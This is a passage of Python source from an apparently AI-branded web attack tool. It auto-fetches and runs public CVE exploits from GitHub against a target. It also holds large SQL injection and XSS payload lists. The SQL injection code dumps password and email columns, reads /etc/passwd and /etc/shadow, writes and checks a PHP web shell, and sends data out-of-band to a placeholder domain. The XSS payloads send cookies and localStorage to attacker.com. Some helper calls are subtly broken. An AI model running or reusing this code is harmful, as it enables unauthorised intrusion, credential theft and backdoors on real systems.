        print("[AI] Error message detected. Trying error-based payloads.")
        # This could be a trigger for more specific error-based payloads if not already tried.
        # For now, just a print.

    # Ensure unique payloads
    dynamic_payloads = list(dict.fromkeys(dynamic_payloads))
    
    if not dynamic_payloads:
        print("[AI] No specific dynamic payloads generated. Returning default.")
        # Fallback to some generic bypasses if nothing specific was generated
        if vulnerability_type == "SQL Injection":
            dynamic_payloads.append("1' OR '1'='1' --")
        elif vulnerability_type == "XSS":
            dynamic_payloads.append("<script>alert('XSS')</script>")

    return dynamic_payloads


def exploit_cve(cve_id, target, report, output):
    """
    Attempts to find and execute a public exploit for a given CVE ID.
    This function is designed to be aggressive, aiming for RCE or significant info disclosure.
    """
    output.print(f"\n[+] Initiating aggressive exploit attempt for {cve_id} on {target}...")
    try:
        # 1. Find Exploit Code using Web Search
        output.print(f"  [INFO] Searching for high-impact exploits (RCE, SQLi) for {cve_id}...")
        search_query = f'"{cve_id}" exploit PoC RCE python github'
        
        # Use the google_web_search tool
        search_results = google_web_search(query=search_query)

        if not search_results or not hasattr(search_results, 'results') or not search_results.results:
            output.print(f"  [WARNING] No potential exploit URLs found for {cve_id} via web search.")
            return

        exploit_url = None
        for result in search_results.results:
            if 'github.com' in result.url and '.py' in result.url:
                exploit_url = result.url
                output.print(f"  [INFO] Found promising Python exploit on GitHub: {exploit_url}")
                break

        if not exploit_url:
            output.print("  [WARNING] Could not find a suitable Python exploit on GitHub. Aborting CVE attack.")
            return

        # 2. Fetch Exploit Code
        output.print(f"  [INFO] Fetching exploit code from {exploit_url}...")
        fetched_content = web_fetch(prompt=f"get the raw code from {exploit_url}")

        if not fetched_content or not fetched_content.content:
            output.print("  [ERROR] Failed to fetch exploit code content.")
            return

        exploit_code = fetched_content.content

        # 3. AI-driven Code Analysis and Adaptation
        output.print("  [AI] Analyzing and adapting the exploit code for the target...")
        # This is a simplified representation of AI-driven adaptation.
        domain = target.split('//')[-1].split('/')[0]
        adapted_code = exploit_code.replace("https://example.com", target).replace("http://example.com", target)
        adapted_code = adapted_code.replace("TARGET_URL", target).replace("RHOST", domain)

        if adapted_code == exploit_code:
            output.print("  [AI-WARNING] AI could not automatically adapt the code. Proceeding with original, but it may fail.")
        else:
            output.print("  [AI-SUCCESS] Exploit code adapted for the target.")

        # 4. Execute Exploit
        exploit_filename = f"/tmp/{cve_id}_{int(time.time())}.py"
        output.print(f"  [INFO] Saving adapted exploit to {exploit_filename}")
        write_file(file_path=exploit_filename, content=adapted_code)

        command_to_run = f"python3 {exploit_filename}"
        if "sys.argv" in adapted_code:
             command_to_run = f"python3 {exploit_filename} {target}"

        output.print(f"  [EXEC] Running exploit with command: '{command_to_run}' (Timeout: 300s)")
        result = run_shell_command(command=f"timeout 300 {command_to_run}", description=f"Execute {cve_id} exploit.")

        # 5. Verify Success and Report
        evidence = f"EXPLOIT URL: {exploit_url}\nCOMMAND: {command_to_run}\nSTDOUT:\n{result.stdout}\n\nSTDERR:\n{result.stderr}"
        if result.exit_code == 0 and (re.search(r'uid=\d+|nt authority\\system|root:x:0:0', result.stdout, re.IGNORECASE)):
            output.print(f"  [CRITICAL-SUCCESS] Exploit for {cve_id} likely succeeded! RCE achieved.")
            report.add_finding(
                vulnerability=f"Remote Code Execution via {cve_id}",
                severity="Critical",
                url=target,
                parameter="N/A",
                payload=exploit_url,
                description=f"Successfully exploited {cve_id} to achieve Remote Code Execution.",
                remediation=f"Patch the system immediately for {cve_id}. Refer to the vendor's security advisory.",
                evidence=evidence
            )
        elif result.exit_code == 0 and result.stdout:
             output.print(f"  [HIGH-SUCCESS] Exploit for {cve_id} executed and returned output. Manual verification needed.")
             report.add_finding(
                vulnerability=f"Potential Exploit Success for {cve_id}",
                severity="High",
                url=target,
                parameter="N/A",
                payload=exploit_url,
                description=f"Exploit for {cve_id} executed without obvious errors and produced output. This could indicate information disclosure or another form of successful exploitation.",
                remediation=f"Patch the system for {cve_id}. Manually verify the output to determine the full impact.",
                evidence=evidence
            )
        else:
            output.print(f"  [INFO] Exploit for {cve_id} finished. Exit code: {result.exit_code}. No clear success indicators found.")

        # 6. Cleanup
        os.remove(exploit_filename)
        output.print(f"  [INFO] Cleaned up temporary exploit file: {exploit_filename}")

    except Exception as e:
        output.print(f"  [CRITICAL-ERROR] The CVE exploit module failed unexpectedly for {cve_id}: {e}")
        output.print("  [INFO] This error will be ignored, and the scan will continue with other modules.")
        # We log the error but do not re-raise it, ensuring the main tool continues.


# --- SQL Injection Module ---

def perform_sqli_attack(target_url, method="GET", data=None, headers=None, cookies=None, timeout=10, verify_ssl=True):
    """
    Performs various SQL Injection attacks on the target URL.

    Args:
        target_url (str): The URL to attack.
        method (str): HTTP method (GET or POST).
        data (dict): POST data.
        headers (dict): HTTP headers.
        cookies (dict): HTTP cookies.
        timeout (int): Request timeout in seconds.
        verify_ssl (bool): Whether to verify SSL certificates.

    Returns:
        list: A list of dictionaries, each representing a detected vulnerability or information.
    """
    print(f"[+] Starting SQL Injection scan for: {target_url}")
    vulnerabilities = []

    # Common SQLi payloads (Error-based, Blind, Time-based)
    sqli_payloads = [
        # Error-based SQLi
        "' OR 1=1 --",
        "\" OR 1=1 --",
        "1' OR '1'='1",
        "1\" OR \"1\"=\"1",
        "1' AND 1=CAST( (SELECT @@version) AS INT) --", # MySQL/MSSQL version
        "1' AND 1=CAST( (SELECT version()) AS INT) --", # PostgreSQL version
        "1' AND 1=CAST( (SELECT user()) AS INT) --", # MySQL/PostgreSQL user
        "1' AND 1=CAST( (SELECT current_database()) AS INT) --", # PostgreSQL database
        "1' AND 1=CAST( (SELECT db_name()) AS INT) --", # MSSQL database
        "1' AND 1=CAST( (SELECT @@hostname) AS INT) --", # MSSQL hostname
        "1' AND 1=CAST( (SELECT host_name()) AS INT) --", # PostgreSQL hostname
        "1' AND 1=CAST( (SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 0,1) AS INT) --", # MySQL table name
        "1' AND 1=CAST( (SELECT table_name FROM information_schema.tables WHERE table_catalog = current_database() LIMIT 0,1) AS INT) --", # PostgreSQL table name
        "1' AND 1=CAST( (SELECT name FROM master..sysdatabases WHERE name NOT IN ('master', 'tempdb', 'model', 'msdb') LIMIT 0,1) AS INT) --", # MSSQL database names
        "1' AND 1=CAST( (SELECT column_name FROM information_schema.columns WHERE table_name = 'users' LIMIT 0,1) AS INT) --", # MySQL column name
        "1' AND 1=CAST( (SELECT column_name FROM information_schema.columns WHERE table_name = 'users' AND table_catalog = current_database() LIMIT 0,1) AS INT) --", # PostgreSQL column name
        "1' AND 1=CAST( (SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name = 'users') AS INT) --", # MSSQL column name
        "1' AND 1=CAST( (SELECT username FROM users LIMIT 0,1) AS INT) --", # MySQL/PostgreSQL data extraction
        "1' AND 1=CAST( (SELECT TOP 1 username FROM users) AS INT) --", # MSSQL data extraction

        # Time-based Blind SQLi (MySQL/PostgreSQL)
        "1' AND SLEEP(5) --",
        "1' UNION SELECT SLEEP(5) --",
        "1' OR IF(1=1,SLEEP(5),0) --",
        "1' AND (SELECT 5 FROM PG_SLEEP(5)) --", # PostgreSQL

        # Boolean-based Blind SQLi
        "1' AND 1=2 --", # Should return false
        "1' AND 1=1 --", # Should return true

        # WAF Bypass techniques
        "1' /*!UNION*/ SELECT 1,2,3 --", # MySQL inline comment bypass
        "1' UNION /*!50000SELECT*/ 1,2,3 --", # MySQL versioned comment bypass
        "1' UNI%0bON SELE%0bCT 1,2,3 --", # Whitespace bypass
        "1' UNION SELECT '<?php phpinfo(); ?>' INTO OUTFILE '/var/www/html/info.php' --", # File write (example)
        "1' UNION SELECT LOAD_FILE('/etc/passwd') --", # File read (example)
        "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --", # Example for boolean-based
        "1' AND (SELECT SUBSTRING(version(),1,1)) = '5' --", # Example for boolean-based version check
        # --- Error-Based SQLi (Expanded) ---
        "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT @@version), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", # MySQL (double query)
        "1' AND EXTRACTVALUE(1,CONCAT(0x5c, (SELECT @@version)))--", # MySQL (XML based)
        "1' AND 1=CONVERT(INT, (SELECT @@version))--", # MSSQL error
        "1' AND 1=(SELECT TO_NUMBER(user) FROM DUAL)--", # Oracle error
        "1' AND 1=(SELECT CAST(current_setting('server_version') AS int))--", # PostgreSQL (current_setting)
        "1' AND 1=CONVERT(int, (SELECT @@version_compile_os))--", # MSSQL OS version
        "1' AND 1=CAST(char(113)+char(119)+char(98)+char(106)+char(113)+(select user)+char(113)+char(118)+char(122)+char(113)+char(113) as NVARCHAR(4000))--", # MSSQL error-based string concat
        "1' AND 1=CAST((SELECT substring(@@version,1,1)) AS INT)--", # MySQL error-based version check
        "1' AND 1=CAST((SELECT substring(user(),1,1)) AS INT)--", # MySQL error-based user check
        "1' AND 1=CAST((SELECT substring(database(),1,1)) AS INT)--", # MySQL error-based database check

        # --- Time-Based Blind SQLi (Expanded) ---
        "' AND BENCHMARK(5000000,MD5(1))--", # MySQL CPU intensive
        "' OR IF(1=1,SLEEP(5),0)", # MySQL conditional sleep
        "' WAITFOR DELAY '0:0:5'--", # MSSQL
        "'; WAITFOR DELAY '0:0:5'--", # MSSQL with semicolon
        "' AND DBMS_LOCK.SLEEP(5)--", # Oracle
        "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", # Oracle
        "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1'='1--", # MySQL subquery sleep
        "1' AND 1=(SELECT 1 FROM PG_SLEEP(5))--", # PostgreSQL variation
        "1' AND 1=(SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1'='1--", # Generic subquery sleep

        # --- Boolean-Based Blind SQLi (Expanded) ---
        "1' AND 'a'='a", # Tautology
        "1' AND 'a'='b", # Contradiction
        "1' AND SUBSTR(VERSION(),1,1)='5'--", # MySQL version check
        "1' AND (SELECT ASCII(SUBSTRING((SELECT database()),1,1)))>100--", # MySQL char code check
        "1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND SUBSTRING(table_name,1,1) > 'a')--", # MySQL table enumeration

        # --- UNION-Based (Expanded) ---
        "UNION SELECT 1,2,3--", # Common column count
        "UNION SELECT 1,version(),database()--", # MySQL/PostgreSQL info
        "UNION SELECT 1,user(),@@hostname--", # MySQL/PostgreSQL info
        "UNION SELECT 1,table_name,column_name FROM information_schema.columns--", # MySQL/PostgreSQL table/column enum
        "UNION SELECT 1,load_file('/etc/passwd'),3--", # MySQL file read
        "UNION SELECT 1,'<?php system($_GET[\"cmd\"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'--", # MySQL shell upload

        # --- WAF Bypasses & Obfuscation (Expanded) ---
        "1' AND 1=1 AND '%'='%'", # Tautology with comment
        "1' OR TRUE --", # Boolean true
        "1' or 0=0--", # Boolean true
        "1' and (select * from (select sleep(0))a)--", # No-op sleep for baseline
        "1' OR '1'='1'#", # Hash comment
        "1' OR '1'='1'/*", # Multi-line comment
        "1' OR '1'='1'-- ", # Double dash comment with space

        # --- Out-of-Band (OOB) SQLi (New) ---
        "1' AND LOAD_FILE(CONCAT('\\\\',(SELECT HEX(SUBSTRING(@@version,1,10))),'.{oob_domain}\\test.txt'))--", # MySQL OOB DNS
        "1' AND master..xp_cmdshell('nslookup (SELECT @@version).{oob_domain}')--", # MSSQL OOB DNS
        "1' AND UTL_HTTP.REQUEST('http://{oob_domain}/'||(SELECT user FROM DUAL))--", # Oracle OOB HTTP
        "1' AND (SELECT pg_send_query(pg_connect('host={oob_domain} port=80 dbname=http query=(SELECT version())')) IS NOT NULL)--", # PostgreSQL OOB HTTP (Conceptual)
        "1' AND (SELECT utl_inaddr.get_host_address('{oob_domain}')) IS NOT NULL--" # Oracle OOB DNS
    ]
    error_patterns = {
        "MySQL": r"SQL syntax|MySQL error|Warning: mysql_|You have an error in your SQL syntax",
        "PostgreSQL": r"PostgreSQL error|syntax error at or near|PG::SyntaxError",
        "MSSQL": r"Microsoft OLE DB Provider for SQL Server error|SQL Server|Unclosed quotation mark",
        "Oracle": r"ORA-\d{5}|Oracle error",
        "Generic": r"SQLSTATE|database error|syntax error"
    }

    # Function to send request and check for errors/time delays
    def send_and_check(payload, param_name, original_response_time):
        current_data = data.copy() if data else {}
        current_headers = headers.copy() if headers else {}
        current_cookies = cookies.copy() if cookies else {}

        if method == "GET":
            test_url = f"{target_url}?{param_name}={quote_plus(payload)}"
            start_time = time.time()
            try:
                response = requests.get(test_url, headers=current_headers, cookies=current_cookies, timeout=timeout, verify=verify_ssl)
                end_time = time.time()
                response_time = end_time - start_time
                return response, response_time
            except requests.exceptions.RequestException as e:
                print(f"[-] Request failed: {e}")
                return None, 0
        elif method == "POST":
            current_data[param_name] = payload
            start_time = time.time()
            try:
                response = requests.post(target_url, data=current_data, headers=current_headers, cookies=current_cookies, timeout=timeout, verify=verify_ssl)
                end_time = time.time()
                response_time = end_time - start_time
                return response, response_time
            except requests.exceptions.RequestException as e:
                print(f"[-] Request failed: {e}")
                return None, 0
        return None, 0

    # Identify injectable parameters (simplified for now, assumes parameters are known or discovered elsewhere)
    # For a real tool, this would involve parsing forms, URLs, JSON bodies etc.
    # For this example, let's assume a single parameter 'id' for demonstration.
    # In a real scenario, ai_analyze_scan_results would help identify these.
    parameters_to_test = ['id'] # Placeholder, should be dynamically discovered

    for param_name in parameters_to_test:
        print(f"[*] Testing parameter: {param_name}")

        # Get baseline response time
        baseline_payload = "1"
        baseline_response, original_response_time = send_and_check(baseline_payload, param_name, 0)
        if baseline_response is None:
            continue

        for payload in sqli_payloads:
            print(f"    [>] Trying payload: {payload[:50]}...") # Truncate long payloads for display
            response, response_time = send_and_check(payload, param_name, original_response_time)

            if response is None:
                continue

            # Check for Error-based SQLi
            for db_type, pattern in error_patterns.items():
                if re.search(pattern, response.text, re.IGNORECASE):
                    vulnerabilities.append({
                        "type": "SQL Injection (Error-based)",
                        "severity": "High",
                        "parameter": param_name,
                        "payload": payload,
                        "response_snippet": response.text[:500], # Snippet of the response
                        "db_type": db_type,
                        "poc_code": f"import requests\nrequests.request(method='{method}', url='{target_url}', {{'data=' + str(data) if data else ''}}, {{'headers=' + str(headers) if headers else ''}}, {{'cookies=' + str(cookies) if cookies else ''}}, timeout={{timeout}}, verify={{verify_ssl}})" # Placeholder, needs actual PoC generation
                    })
                    print(f"        [!!!] SQL Injection (Error-based) detected in {param_name} ({db_type})!")
                    # Attempt data extraction if error-based is found
                    extracted_data = extract_sqli_data(target_url, method, data, headers, cookies, timeout, verify_ssl, param_name, db_type, send_and_check)
                    if extracted_data:
                        vulnerabilities[-1]["extracted_data"] = extracted_data
                        print(f"            [+] Extracted data: {extracted_data}")
                    break # Move to next payload if error found

            # Check for Time-based Blind SQLi
            if "SLEEP(5)" in payload or "PG_SLEEP(5)" in payload:
                if response_time >= original_response_time + 4: # Check for significant delay
                    vulnerabilities.append({
                        "type": "SQL Injection (Time-based Blind)",
                        "severity": "High",
                        "parameter": param_name,
                        "payload": payload,
                        "response_time": response_time,
                        "original_response_time": original_response_time,
                        "poc_code": f"import requests\nrequests.request(method='{method}', url='{target_url}', {{'data=' + str(data) if data else ''}}, {{'headers=' + str(headers) if headers else ''}}, {{'cookies=' + str(cookies) if cookies else ''}}, timeout={{timeout}}, verify={{verify_ssl}})" # Placeholder
                    })
                    print(f"        [!!!] SQL Injection (Time-based Blind) detected in {param_name}!")

            # Check for Boolean-based Blind SQLi (requires more sophisticated logic, e.g., comparing content)
            # This is a placeholder for future expansion.
            if "AND 1=2" in payload or "AND 1=1" in payload:
                # For full boolean-based detection, we'd need to compare responses for true/false conditions.
                # This would involve sending a true condition and a false condition and comparing the content/length.
                pass # Placeholder for now

    print(f"[+] SQL Injection scan completed for: {target_url}")
    return vulnerabilities

def extract_sqli_data(target_url, method, data, headers, cookies, timeout, verify_ssl, param_name, db_type, send_and_check_func):
    """
    Attempts to extract data using SQL Injection with enhanced techniques.
    """
    extracted_info = {}
    
    # 1. Determine number of columns
    num_columns = 0
    for i in range(1, 20): # Try up to 20 columns
        test_payload = f"1' ORDER BY {i} --"
        response, _ = send_and_check_func(test_payload, param_name, 0)
        if response and "Unknown column" not in response.text and "order clause" not in response.text.lower():
            num_columns = i
        else:
            break
    
    if num_columns == 0:
        print(f"        [INFO] Could not determine number of columns for UNION-based attack.")
        # Fallback to a common number if column count cannot be determined
        num_columns = 3 # Default to 3 for union select examples if no specific count found

    print(f"        [INFO] Determined {num_columns} columns for UNION-based attack.")

    # 2. Identify string-compatible columns for UNION SELECT
    string_columns = []
    for i in range(1, num_columns + 1):
        union_payload_parts = ["NULL"] * num_columns
        union_payload_parts[i-1] = "'SQLiTEST'"
        payload = f"1' UNION SELECT {','.join(union_payload_parts)} --"
        response, _ = send_and_check_func(payload, param_name, 0)
        if response and "SQLiTEST" in response.text:
            string_columns.append(i)
    
    if not string_columns:
        print(f"        [INFO] No string-compatible columns found for UNION-based data extraction.")
        # If no string columns, try to use the first column for basic info extraction
        if num_columns > 0:
            string_columns.append(1) # Fallback to first column

    print(f"        [INFO] String-compatible columns: {string_columns}")

    # 3. Extract basic DB info (version, user, database, hostname)
    info_payload_templates = {
        "version": {"MySQL": "version()", "PostgreSQL": "version()", "MSSQL": "@@version", "Oracle": "version"},
        "user": {"MySQL": "user()", "PostgreSQL": "user", "MSSQL": "user_name()", "Oracle": "user"},
        "database": {"MySQL": "database()", "PostgreSQL": "current_database()", "MSSQL": "db_name()", "Oracle": "sys_context('USERENV','DB_NAME')"},
        "hostname": {"MySQL": "@@hostname", "PostgreSQL": "inet_server_addr()", "MSSQL": "host_name()", "Oracle": "utl_inaddr.get_host_name"}
    }

    for info_name, db_funcs in info_payload_templates.items():
        db_func = db_funcs.get(db_type, db_funcs.get("MySQL")) # Default to MySQL if specific not found
        if not db_func: continue

        for col_idx in string_columns:
            union_payload_parts = ["NULL"] * num_columns
            union_payload_parts[col_idx-1] = db_func
            payload = f"1' UNION SELECT {','.join(union_payload_parts)} --"
            response, _ = send_and_check_func(payload, param_name, 0)
            if response and response.status_code == 200:
                # Attempt to extract the value from the response, looking for common patterns
                match = re.search(r'(\b\d+\.\d+\.\d+\b|\b\w+@[\w\.]+\b|\b[\w\d\._-]+\b)', response.text, re.IGNORECASE)
                if match:
                    extracted_info[info_name] = match.group(0)
                    print(f"            [+] Extracted {info_name}: {extracted_info[info_name]}")
                    break # Move to next info_name

    # 4. Table and Column Enumeration (for MySQL/PostgreSQL/MSSQL)
    if db_type in ["MySQL", "PostgreSQL"]:
        print(f"        [INFO] Attempting to enumerate tables and columns for {db_type}...")
        for col_idx in string_columns:
            # Enumerate tables
            table_payload = f"1' UNION SELECT {','.join(['NULL']*(col_idx-1) + ['group_concat(table_name)'] + ['NULL']*(num_columns-col_idx))} FROM information_schema.tables WHERE table_schema=database() --"
            response, _ = send_and_check_func(table_payload, param_name, 0)
            if response and response.status_code == 200:
                match = re.search(r'(\b\w+(?:,\w+)*\b)', response.text)
                if match:
                    tables = match.group(0).split(',')
                    extracted_info["tables"] = tables
                    print(f"            [+] Extracted tables: {tables}")

                    # Enumerate columns for a few interesting tables (e.g., 'users', 'admin')
                    for table in tables:
                        if "user" in table.lower() or "admin" in table.lower():
                            column_payload = f"1' UNION SELECT {','.join(['NULL']*(col_idx-1) + ['group_concat(column_name)'] + ['NULL']*(num_columns-col_idx))} FROM information_schema.columns WHERE table_schema=database() AND table_name='{table}' --"
                            response_cols, _ = send_and_check_func(column_payload, param_name, 0)
                            if response_cols and response_cols.status_code == 200:
                                match_cols = re.search(r'(\b\w+(?:,\w+)*\b)', response_cols.text)
                                if match_cols:
                                    columns = match_cols.group(0).split(',')
                                    extracted_info[f"columns_{table}"] = columns
                                    print(f"            [+] Extracted columns for {table}: {columns}")

                                    # Attempt to dump data from sensitive columns
                                    sensitive_cols_in_table = [c for c in columns if "pass" in c.lower() or "user" in c.lower() or "email" in c.lower()]
                                    if sensitive_cols_in_table:
                                        dump_cols = ", ".join(sensitive_cols_in_table)
                                        dump_payload = f"1' UNION SELECT {','.join(['NULL']*(col_idx-1) + [f'group_concat({dump_cols})'] + ['NULL']*(num_columns-col_idx))} FROM {table} --"
                                        response_dump, _ = send_and_check_func(dump_payload, param_name, 0)
                                        if response_dump and response_dump.status_code == 200:
                                            match_dump = re.search(r'(\b\w+(?:,\w+)*\b)', response_dump.text)
                                            if match_dump:
                                                dumped_data = match_dump.group(0)
                                                extracted_info[f"data_{table}"] = dumped_data
                                                print(f"            [CRITICAL] Dumped data from {table}: {dumped_data[:100]}...")
                                                break # Stop after first sensitive data dump

    elif db_type == "MSSQL":
        print(f"        [INFO] Attempting to enumerate tables and columns for MSSQL...")
        for col_idx in string_columns:
            # Enumerate tables
            table_payload = f"1' UNION SELECT {','.join(['NULL']*(col_idx-1) + ['(SELECT TOP 1 name FROM sys.tables WHERE is_ms_shipped = 0 AND name NOT IN (SELECT name FROM sys.tables WHERE is_ms_shipped = 0 ORDER BY name OFFSET (N) ROWS FETCH NEXT 1 ROW ONLY))'] + ['NULL']*(num_columns-col_idx))} --"
            # This requires iterating N for each table, which is complex for a single payload.
            # For simplicity, we'll try to get a few common tables directly.
            common_mssql_tables = ["users", "admins", "employees"]
            for table in common_mssql_tables:
                test_table_payload = f"1' AND EXISTS(SELECT 1 FROM sys.tables WHERE name='{table}') --"
                response_exists, _ = send_and_check_func(test_table_payload, param_name, 0)
                if response_exists and "exists" in response_exists.text.lower(): # Heuristic for existence
                    extracted_info["tables"] = extracted_info.get("tables", []) + [table]
                    print(f"            [+] Found MSSQL table: {table}")
                    # Enumerate columns for this table
                    column_payload = f"1' UNION SELECT {','.join(['NULL']*(col_idx-1) + [f'(SELECT TOP 1 name FROM sys.columns WHERE object_id = OBJECT_ID(''{table}'') AND name NOT IN (SELECT name FROM sys.columns WHERE object_id = OBJECT_ID(''{table}'') ORDER BY name OFFSET (N) ROWS FETCH NEXT 1 ROW ONLY))'] + ['NULL']*(num_columns-col_idx))} --"
                    # Similar complexity for columns, simplified for now
                    common_mssql_columns = ["username", "password", "email"]
                    for col in common_mssql_columns:
                        test_col_payload = f"1' AND EXISTS(SELECT 1 FROM sys.columns WHERE object_id = OBJECT_ID('{table}') AND name='{col}') --"
                        response_col_exists, _ = send_and_check_func(test_col_payload, param_name, 0)
                        if response_col_exists and "exists" in response_col_exists.text.lower():
                            extracted_info[f"columns_{table}"] = extracted_info.get(f"columns_{table}", []) + [col]
                            print(f"            [+] Found MSSQL column: {table}.{col}")
                            # Attempt to dump data
                            dump_payload = f"1' UNION SELECT {','.join(['NULL']*(col_idx-1) + [f'(SELECT TOP 1 {col} FROM {table})'] + ['NULL']*(num_columns-col_idx))} --"
                            response_dump, _ = send_and_check_func(dump_payload, param_name, 0)
                            if response_dump and response_dump.status_code == 200:
                                match_dump = re.search(r'(\b\w+(?:,\w+)*\b)', response_dump.text)
                                if match_dump:
                                    dumped_data = match_dump.group(0)
                                    extracted_info[f"data_{table}_{col}"] = dumped_data
                                    print(f"            [CRITICAL] Dumped data from {table}.{col}: {dumped_data[:100]}...")
                                    break # Stop after first sensitive data dump

    # 5. File Read/Write (MySQL specific, using LOAD_FILE and INTO OUTFILE)
    if db_type == "MySQL":
        print(f"        [INFO] Attempting file read/write for MySQL...")
        sensitive_files = [
            "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/mysql/my.cnf",
            "/var/www/html/config.php", "/var/www/html/index.php",
            "C:\\Windows\\win.ini", "C:\\boot.ini", "C:\\xampp\\apache\\conf\\httpd.conf"
        ]
        for file_path in sensitive_files:
            for col_idx in string_columns:
                load_file_payload = f"1' UNION SELECT {','.join(['NULL']*(col_idx-1) + [f'LOAD_FILE(\'{file_path}\')'] + ['NULL']*(num_columns-col_idx))} --"
                response_file, _ = send_and_check_func(load_file_payload, param_name, 0)
                if response_file and response_file.status_code == 200 and (file_path.split('/')[-1] in response_file.text or "root:x:0:0" in response_file.text or "[fonts]" in response_file.text):
                    extracted_info[f"file_content_{file_path}"] = response_file.text[:500]
                    print(f"            [CRITICAL] Leaked content of {file_path}: {response_file.text[:100]}...")
                    break # Found content, move to next file

        # Attempt to write a basic PHP shell
        php_shell_content = "<?php system($_GET['cmd']); ?>"
        shell_path = "/var/www/html/shell.php"
        for col_idx in string_columns:
            write_shell_payload = f"1' UNION SELECT {','.join(['NULL']*(col_idx-1) + [f'\'{php_shell_content}\''] + ['NULL']*(num_columns-col_idx))} INTO OUTFILE '{shell_path}' --"
            response_write, _ = send_and_check_func(write_shell_payload, param_name, 0)
            if response_write and response_write.status_code == 200: # Success often means no error
                # Verify if the shell was written by trying to access it
                verify_shell_url = f"{target_url.split('?')[0].rstrip('/')}{shell_path}?cmd=id"
                response_verify, _ = send_and_check_func("", "", 0, url=verify_shell_url) # Direct GET request
                if response_verify and response_verify.status_code == 200 and "uid=" in response_verify.text:
                    extracted_info["php_shell_uploaded"] = shell_path
                    print(f"            [CRITICAL] PHP shell uploaded to {shell_path} and confirmed executable!")
                    break

    # 6. OOB Integration (Conceptual - requires an OOB listener)
    # This part would typically involve sending payloads that trigger DNS/HTTP requests to an attacker-controlled domain.
    # The results would then be checked on the attacker's side. For this simulation, we'll just log the attempt.
    oob_domain_placeholder = "YOUR_OOB_DOMAIN.com" # User would replace this
    oob_payloads = [
        f"1' AND LOAD_FILE(CONCAT('\\\\',(SELECT HEX(SUBSTRING(@@version,1,10))),'.{oob_domain_placeholder}\\test.txt'))--", # MySQL OOB DNS
        f"1' AND master..xp_cmdshell('nslookup (SELECT @@version).{oob_domain_placeholder}')--", # MSSQL OOB DNS
        f"1' AND UTL_HTTP.REQUEST('http://{oob_domain_placeholder}/'||(SELECT user FROM DUAL))--", # Oracle OOB HTTP
        f"1' AND (SELECT pg_send_query(pg_connect('host={oob_domain_placeholder} port=80 dbname=http query=(SELECT version())')) IS NOT NULL)--", # PostgreSQL OOB HTTP (Conceptual)
    ]
    for payload in oob_payloads:
        response, _ = send_and_check_func(payload, param_name, 0)
        if response and response.status_code == 200: # OOB often doesn't return errors
            print(f"            [INFO] OOB payload sent: {payload[:50]}... Check your OOB listener for interactions.")
            extracted_info["oob_attempt"] = "Check OOB listener for interactions."
            break

    return extracted_info if extracted_info else None

# --- XSS Module ---

def perform_xss_attack(target_url, method="GET", data=None, headers=None, cookies=None, timeout=10, verify_ssl=True):
    """
    Performs various Cross-Site Scripting (XSS) attacks on the target URL.

    Args:
        target_url (str): The URL to attack.
        method (str): HTTP method (GET or POST).
        data (dict): POST data.
        headers (dict): HTTP headers.
        cookies (dict): HTTP cookies.
        timeout (int): Request timeout in seconds.
        verify_ssl (bool): Whether to verify SSL certificates.

    Returns:
        list: A list of dictionaries, each representing a detected vulnerability or information.
    """
    print(f"[+] Starting XSS scan for: {target_url}")
    vulnerabilities = []

    xss_payloads = [
        # Basic reflected XSS
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "';alert(1)//",
        "\"><script>alert(1)</script>",
        "<svg/onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=\"javascript:alert(1)\"></iframe>",
        "<a href=\"javascript:alert(1)\">Click Me</a>",
        
        # HTML entity encoding bypass
        "&lt;script&gt;alert(1)&lt;/script&gt;",
        "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
        
        # URL encoding bypass
        "%3cscript%3ealert(1)%3c/script%3e",
        
        # Obfuscated/Tricky payloads
        "<scr<script>ipt>alert(1)</scr<script>ipt>",
        "<img src=x onerrOr=alert(1)>", # Case variation
        "<svg onload=alert(1)//", # Comment to break attributes
        
        # XSS for data extraction (document.cookie)
        "<script>fetch('//attacker.com/log?c='+document.cookie)</script>",
        "<img src=x onerror=this.src='//attacker.com/log?c='+document.cookie>",
        
        # XSS for localStorage access
        "<script>fetch('//attacker.com/log?ls='+JSON.stringify(localStorage))</script>",
        
        # XSS for internal API calls (example)
        "<script>fetch('/api/v1/users', {method: 'POST', body: JSON.stringify({name: 'xss'})})</script>",
        
        # DOM XSS (requires client-side analysis, but payloads can trigger it)
        "<img src=\"#\" onerror=\"eval(location.hash.substr(1))\">#alert(1)",
        
        # Mutation XSS (example, often context-dependent)
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
        
        # --- Event Handlers (Expanded) ---
        "<body onpageshow=alert(1)>",
        "<body onresize=alert(1)>",
        "<div onwheel=alert(1)>SCROLL</div>",
        "<input onkeyup=alert(1)>",
        "<input onchange=alert(1)>",
        "<form onsubmit=alert(1)><input type=submit></form>",
        "<video src=x onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<picture><img src=x onerror=alert(1)></picture>",
        "<details ontoggle=alert(1)><summary>Click</summary></details>",
        "<image src=x onerror=alert(1)>",
        "<math><a xlink:href=javascript:alert(1)>click</a></math>",
        "<animate onbegin=alert(1)>",
        "<foreignObject><script>alert(1)</script></foreignObject>",
        "<a onpointerover=alert(1)>Move mouse here</a>",
        "<div oncontextmenu=alert(1)>Right-click here</div>",
        "<div oncopy=alert(1)>Copy this text</div>",
        "<div oncut=alert(1)>Cut this text</div>",
        "<div onpaste=alert(1)>Paste here</div>",
        "<input onkeydown=alert(1)>",
        "<marquee onbounce=alert(1)>bounce</marquee>",
        "<marquee onfinish=alert(1)>finish</marquee>",
        "<body onhashchange=alert(1)>",
        "<body onpagehide=alert(1)>",
        "<body onstorage=alert(1)>",
        "<body onunload=alert(1)>",
        "<svg><g/onload=alert(1)>",
        "<svg><foreignObject><body/onload=alert(1)>",

        # --- Encoding & Bypass Variations (Expanded) ---
